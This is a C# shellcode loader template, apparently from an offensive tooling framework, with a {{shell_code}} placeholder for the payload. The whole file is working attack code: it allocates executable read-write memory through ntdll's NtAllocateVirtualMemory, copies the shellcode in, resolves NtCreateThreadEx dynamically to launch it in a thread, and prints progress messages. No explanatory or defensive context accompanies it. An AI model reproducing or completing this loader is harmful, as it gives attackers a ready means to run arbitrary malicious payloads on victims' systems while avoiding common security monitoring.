using System;
using System.Runtime.InteropServices;

class Program
{
    delegate uint NtCreateThreadExDelegate(
        out IntPtr threadHandle,
        uint desiredAccess,
        IntPtr objectAttributes,
        IntPtr processHandle,
        IntPtr startAddress,
        IntPtr parameter,
        bool createSuspended,
        uint stackZeroBits,
        uint sizeOfStackCommit,
        uint sizeOfStackReserve,
        IntPtr bytesBuffer
    );

    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint MEM_RELEASE = 0x8000;
    const uint STATUS_SUCCESS = 0x00000000;

    [DllImport("ntdll.dll")]
    static extern uint NtAllocateVirtualMemory(
        IntPtr processHandle,
        ref IntPtr baseAddress,
        UIntPtr zeroBits,
        ref uint regionSize,
        uint allocationType,
        uint protect
    );

    [DllImport("ntdll.dll")]
    static extern uint NtFreeVirtualMemory(
        IntPtr processHandle,
        ref IntPtr baseAddress,
        ref uint regionSize,
        uint freeType
    );

    [DllImport("ntdll.dll")]
    static extern uint NtWaitForSingleObject(
        IntPtr handle,
        bool alertable,
        IntPtr timeout
    );

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    static void Main()
    {
        {{shell_code}}
        
        IntPtr baseAddress = IntPtr.Zero;
        uint size = (uint)buf.Length;

        uint status = NtAllocateVirtualMemory(
            (IntPtr)(-1),
            ref baseAddress,
            UIntPtr.Zero,
            ref size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        if (status != STATUS_SUCCESS || baseAddress == IntPtr.Zero)
        {
            Console.WriteLine($"[!] NtAllocateVirtualMemory failed: 0x{status:X}");
            return;
        }

        Console.WriteLine($"[*] Memory allocated at: 0x{baseAddress.ToInt64():X}");

        Marshal.Copy(buf, 0, baseAddress, buf.Length);

        IntPtr pNtCreateThreadEx = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
        if (pNtCreateThreadEx == IntPtr.Zero)
        {
            Console.WriteLine("[!] Failed to resolve NtCreateThreadEx.");
            return;
        }

        var NtCreateThreadEx = (NtCreateThreadExDelegate)Marshal.GetDelegateForFunctionPointer(
            pNtCreateThreadEx, typeof(NtCreateThreadExDelegate)
        );

        IntPtr hThread;
        status = NtCreateThreadEx(
            out hThread,
            0x1FFFFF,
            IntPtr.Zero,
            (IntPtr)(-1),
            baseAddress,
            IntPtr.Zero,
            false,
            0, 0, 0,
            IntPtr.Zero
        );

        if (status != STATUS_SUCCESS)
        {
            Console.WriteLine($"[!] NtCreateThreadEx failed: 0x{status:X}");
            return;
        }

        Console.WriteLine("[*] Shellcode thread started.");

        NtWaitForSingleObject(hThread, false, IntPtr.Zero);

        NtFreeVirtualMemory((IntPtr)(-1), ref baseAddress, ref size, MEM_RELEASE);
        Console.WriteLine("[+] Done.");
    }
}